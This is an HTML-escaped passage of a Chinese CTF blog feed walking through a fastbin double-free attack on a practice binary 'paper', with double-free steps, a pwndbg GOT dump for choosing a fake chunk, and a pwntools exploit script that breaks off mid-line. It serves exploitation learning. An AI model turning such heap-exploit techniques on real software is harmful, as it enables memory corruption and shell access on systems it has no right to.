class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;pwnable怎么用exp呢?  写到&amp;#x2F;tmp目录下&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/dlddw/p/13139172.html&#34;&gt;https://www.cnblogs.com/dlddw/p/13139172.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://etenal.me/archives/972#C30&#34;&gt;https://etenal.me/archives/972#C30&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/L0g4n-blog/p/13033301.html&#34;&gt;https://www.cnblogs.com/L0g4n-blog/p/13033301.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;调试源代码1&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.blackhat.com/presentations/bh-europe-07/Sotirov/Presentation/bh-eu-07-sotirov-apr19.pdf&#34;&gt;https://www.blackhat.com/presentations/bh-europe-07/Sotirov/Presentation/bh-eu-07-sotirov-apr19.pdf&lt;/a&gt;&lt;/p&gt;
</content>
        <category term="PWN入门" />
        <updated>2023-03-07T08:52:20.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-17-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8Bfasbinattack/</id>
        <title>pwn入门-17-堆入门之fasbinattack</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-17-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8Bfasbinattack/"/>
        <content type="html">&lt;p&gt;xuanxuan : &lt;a href=&#34;https://xuanxuanblingbling.github.io/ctf/pwn/2020/02/02/paper/&#34;&gt;https://xuanxuanblingbling.github.io/ctf/pwn/2020/02/02/paper/&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;Write-Some-Paper&#34;&gt;&lt;a href=&#34;#Write-Some-Paper&#34; class=&#34;headerlink&#34; title=&#34;Write_Some_Paper&#34;&gt;&lt;/a&gt;Write_Some_Paper&lt;/h1&gt;&lt;p&gt;申请不同的编号有影响吗????&lt;/p&gt;
&lt;h2 id=&#34;怎么getshell呢&#34;&gt;&lt;a href=&#34;#怎么getshell呢&#34; class=&#34;headerlink&#34; title=&#34;怎么getshell呢?&#34;&gt;&lt;/a&gt;怎么getshell呢?&lt;/h2&gt;&lt;p&gt;​		首先是获取任意或者受限制的地址读写的能力,然后修改关键函数等,比如修改got表,把函数地址替换成system或者后门函数地址,然后再执行的时候就getshell了&lt;/p&gt;
&lt;h2 id=&#34;怎么实现地址写&#34;&gt;&lt;a href=&#34;#怎么实现地址写&#34; class=&#34;headerlink&#34; title=&#34;怎么实现地址写?&#34;&gt;&lt;/a&gt;怎么实现地址写?&lt;/h2&gt;&lt;p&gt;​		利用double free,可以操控堆块的fd,从而实现把任意地址当作bin来进行申请空间,这样就获得了该地址的读写能力&lt;/p&gt;
&lt;h2 id=&#34;double-free&#34;&gt;&lt;a href=&#34;#double-free&#34; class=&#34;headerlink&#34; title=&#34;double free&#34;&gt;&lt;/a&gt;double free&lt;/h2&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;40&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;h&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;40&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;h&amp;quot;&lt;/span&gt;) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;delete(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;delete(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;delete(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;//double free了&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;40&lt;/span&gt;,p64(&lt;span class=&#34;number&#34;&gt;0x60203a&lt;/span&gt;))&lt;span class=&#34;comment&#34;&gt;//这个需要填入覆盖地址了&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;40&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;bbb&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;40&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;bbb&amp;quot;&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;// 这一步后,会把fd(p64(0x60203a)) 放到fastbin的头部,下一次会申请到这里&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;40&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;\x40\x00\x00\x00\x00\x00&amp;quot;&lt;/span&gt;+p64(ELF.symbols[&lt;span class=&#34;string&#34;&gt;&amp;#x27;gg&amp;#x27;&lt;/span&gt;])) &lt;span class=&#34;comment&#34;&gt;//此时申请的就是第一次add时填入的fd地址		&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;申请堆块时的地址约束&#34;&gt;&lt;a href=&#34;#申请堆块时的地址约束&#34; class=&#34;headerlink&#34; title=&#34;申请堆块时的地址约束&#34;&gt;&lt;/a&gt;申请堆块时的地址约束&lt;/h2&gt;&lt;p&gt;​		即size字段需要是fastbin这个链的大小，即目标地址的前8个字节需要满足，64位下这8个字节只要低4个字节满足就可以了。所以通过这种方式，我们可以控制的内存是需要满足一定约束的内存。也可以称这种满足要求的内存部分为伪堆块。获得这种内存有两种方式：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;寻找是否有天然满足伪堆块的约束的内存&lt;/li&gt;
&lt;li&gt;想办法构造伪堆块&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;8字节prev_size 随意 , &lt;font color=&#34;red&#34;&gt;8字节size(64位下前4字节满足大小,如0x40大小)&lt;/font&gt;,要覆盖的fd(要修改的内存地址)&lt;/p&gt;
&lt;p&gt;要找到覆盖的函数,&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; x/&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;gx &lt;span class=&#34;number&#34;&gt;0x602000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x602000&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000601e28&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00007ffff7ffe168&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x602010&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x00007ffff7dee0b0&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00007ffff7a91a70&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x602020&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x00007ffff7a7d5d0&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00007ffff7a7c0e0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x602030&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000400746&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000400756&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x602040&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x00007ffff7a637b0&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00007ffff7a2e740&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x602050&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000400786&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00007ffff7a493b0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x602060&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x00007ffff7a91550&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00007ffff7a7ddb0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x602070&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x00007ffff7a79480&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00000000004007d6&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;这几个地方都可以作为size&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-17-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8Bfasbinattack/image-20230307155602238.png&#34; alt=&#34;image-20230307155602238&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x602000&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x1e&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x60&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x602008&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x68&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xe1&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xff&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xf7&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xff&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x7f&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x602010&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0xb0&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xe0&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xde&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xf7&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xff&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x7f&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x602018&lt;/span&gt; &amp;lt;&lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt;@got.plt&amp;gt;:	&lt;span class=&#34;number&#34;&gt;0x70&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x1a&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xa9&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xf7&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xff&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x7f&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x602020&lt;/span&gt; &amp;lt;&lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;@got.plt&amp;gt;:	&lt;span class=&#34;number&#34;&gt;0xd0&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xd5&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xa7&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xf7&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xff&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x7f&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x602028&lt;/span&gt; &amp;lt;fread@got.plt&amp;gt;:	&lt;span class=&#34;number&#34;&gt;0xe0&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xc0&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xa7&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xf7&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xff&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x7f&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x602030&lt;/span&gt; &amp;lt;__stack_chk_fail@got.plt&amp;gt;:	&lt;span class=&#34;number&#34;&gt;0x46&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x07&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x602038&lt;/span&gt; &amp;lt;system@got.plt&amp;gt;:	&lt;span class=&#34;number&#34;&gt;0x56&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x07&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x602040&lt;/span&gt; &amp;lt;&lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;@got.plt&amp;gt;:	&lt;span class=&#34;number&#34;&gt;0xb0&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x37&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xa6&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xf7&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xff&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x7f&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x602048&lt;/span&gt; &amp;lt;__libc_start_main@got.plt&amp;gt;:	&lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xe7&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xa2&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xf7&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xff&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x7f&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x602050&lt;/span&gt; &amp;lt;__gmon_start__@got.plt&amp;gt;:	&lt;span class=&#34;number&#34;&gt;0x86&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x07&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x602058&lt;/span&gt; &amp;lt;strtol@got.plt&amp;gt;:	&lt;span class=&#34;number&#34;&gt;0xb0&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x93&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xa4&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xf7&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xff&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x7f&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x602060&lt;/span&gt; &amp;lt;&lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;@got.plt&amp;gt;:	&lt;span class=&#34;number&#34;&gt;0x50&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x15&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xa9&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xf7&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		&lt;font color=&#34;red&#34;&gt;根据这个来选择申请的堆块的大小&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;​		注意大小端的问题,这里选取这里作为伪造的chunk的size,然后后面是可控的数据,注意不要把system破坏了,然后把printf修改成后们地址即可&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-17-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8Bfasbinattack/image-20230411214141077.png&#34; alt=&#34;image-20230411214141077&#34;&gt;	&lt;/p&gt;
&lt;h1 id=&#34;exp&#34;&gt;&lt;a href=&#34;#exp&#34; class=&#34;headerlink&#34; title=&#34;exp&#34;&gt;&lt;/a&gt;exp&lt;/h1&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level= &lt;span class=&#34;string&#34;&gt;&amp;quot;debug&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io = process(&lt;span class=&#34;string&#34;&gt;&amp;quot;./paper&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf = ELF(&lt;span class=&#34;string&#34;&gt;&amp;quot;./paper&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;add&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;num,length,context&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;delete paper&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;(0-9):&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(num))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;enter&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(length))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;content&amp;quot;&lt;/span&gt;,context)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;delete&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;index&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;delete paper&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;2&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;(0-9):&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(index))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span 